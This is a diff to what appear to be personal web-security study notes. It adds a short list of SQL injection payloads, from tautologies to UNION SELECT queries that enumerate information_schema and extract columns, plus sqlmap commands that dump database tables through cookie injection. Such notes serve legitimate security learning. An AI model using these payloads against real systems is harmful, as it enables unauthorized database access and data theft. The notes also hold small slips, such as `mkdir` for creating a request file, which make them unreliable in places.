@@ -861,19 +861,34 @@ Lets you modifying the use of an input in a SQL query.
 
 Figure out how an application works and what its intended use is.
 
+Example injections:
+- `' or 1=1#`
+- `' or 1=1-- -`
+- `' UNION SELECT null,null,null#`
+  - Can only select the same amount of items as in the original request
+- `' UNION SELECT null,int(null),int(null)`
+- `' UNION SELECT null,null,version()#`
+- `' UNION SELECT null,null,table_name FROM information_schema.tables#`
+- `' UNION SELECT null,null,column_name FROM information_schema.columns#`
+- `' UNION SELECT null,null,[column] FROM [table]`
+
+
 *Good source:* Portswigger SQL injection cheatsheet
 
+When working with burpsuite, take into account the content length for a valid/invalid request.
+
 sqlmap:
-- `mkdir req.txt` put your request in here
-- `sqlmap -r req.txt`
+- `mkdir [request].txt` put your request in here
+- `sqlmap -r [request].txt`
 
 Think about everything you supply to the application and how it may be used.
 
 Can ask True/False questions if no date is being outputted. Use `substring()` or `sqlmap`.
 
 sqlmap injecting in cookies:
-- `sqlmap -r req2.txt --level=2`
-- `sqlmap -r req2.txt --level=2 --dump` for dumping data in tables
+- `sqlmap -r [request].txt --level=2`
+- `sqlmap -r [request].txt --level=2 --dump` for dumping data in tables
+- `sqlmap -r [request].txt --level=2 --dump -T [table]`
 
 ### XXS (Cross Site Scripting)
 
